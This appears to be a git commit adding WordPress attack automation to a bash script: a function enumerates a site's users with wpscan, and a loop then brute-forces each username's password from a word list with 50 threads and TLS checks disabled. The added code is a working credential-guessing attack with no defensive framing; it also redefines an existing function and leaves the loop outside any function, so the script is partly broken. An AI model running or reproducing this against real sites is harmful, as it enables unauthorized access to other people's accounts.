822dd264f5b2b338e2f5a68f7b6cc50c7a29b06a
meepmaster360 <paulomotaborges@gmail.com>
2024-04-06 08:47:46 +0100

    1

--- wpscanmeepscript.sh
+++ wpscanmeepscript.sh
@@ -101,6 +101,22 @@ function user_enumeration () {
 } 
 
 
+# Perform user enumeration
+
+function user_enumeration () {
+    echo "Performing user enumeration..."
+    wpscan --url "$website_url" --enumerate u > user_enum.txt
+    # Extract usernames from the user enumeration result
+    USERLIST=$(grep 'Username:' user_enum.txt | awk '{print $2}')
+} 
+
+
+# Perform brute force attack for each username
+
+    for USERNAME in $USERLIST; do
+        echo "Performing brute force attack for user: $USERNAME..."
+        wpscan --url "$website_url" --passwords "$PASSWORDLIST" --user "$USERNAME" --max-threads 50 --disable-tls-checks --max-retries 3 --retry-connrefused --output "brute_force_result_$USERNAME.txt"
+    done
 
 # Função Menu Principal
 
